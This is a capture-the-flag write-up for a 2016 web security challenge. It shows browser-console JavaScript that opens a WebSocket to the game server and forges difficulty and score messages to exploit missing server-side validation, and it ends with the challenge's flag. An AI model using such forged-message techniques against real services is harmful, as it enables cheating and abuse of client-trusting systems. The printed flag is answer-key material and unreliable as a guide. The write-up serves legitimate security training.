# Cyber Security Challenge 2016: Tap dat ass part 1


**Category:** Web Security  
**Points:** 40  
**Challenge designer:** Tom Van Goethem  
**Description:**  
> The first part of this challenge is simple, all you need to do is smack enough asses, and you will be presented with a flag!
> 
> Note: this challenge is built with some of the latest and coolest HTML features. If it does not work in your browser, try using the latest Chrome version.

[File Here](challenge-source-files/src.zip)

>Hint: WebSockets are so much fun! You should try it out for yourself!

## Write-up
- lacking server-side validation should be one of the first things one should check

By looking at the server-side code, we can see that the first flag will be sent if our score is higher than 9000 in a certain round. Unfortunately, this is rather hard, if not impossible, to do by hand. 
There are a few options we can use, but they all come down to the same thing: we need to set up a WebSocket connection with the server by ourselves, and fake our score.

In our browser console, we can enter following code to set up the WebSocket, set the difficulty level to a very high number, and fake a "tap".

```js
var ws = new WebSocket('ws://' + window.location.hostname + ':' + window.location.port + '/ass-tapping');
ws.addEventListener('open', function() {
   ws.send(JSON.stringify({
        "action": "updateDifficulty",
        "parameter": {
            "playerId": "FOOBAR123", // can be pretty much any value
            "difficulty": 31337
        }
    }));
});
ws.addEventListener('message', function(msg) {
    var data = JSON.parse(msg.data);
    if (data.action == 'firstFlag') {
        ws.close();
        alert('Flag: ' + data.parameter);
    }
    else if (data.action == 'update') {
        var round = data.parameter.round;
        ws.send(JSON.stringify({
            "action": "increaseScore",
            "parameter": {
                "playerId": "FOOBAR123",
                "roundNumber": round // this has to to match the actual round number
            }
        }));
    }
});
```
The server will then spit out the flag.
 
##Solution
d0nk3ys_h4v3_s0uls_4s_w3ll
## Other write-ups and resources
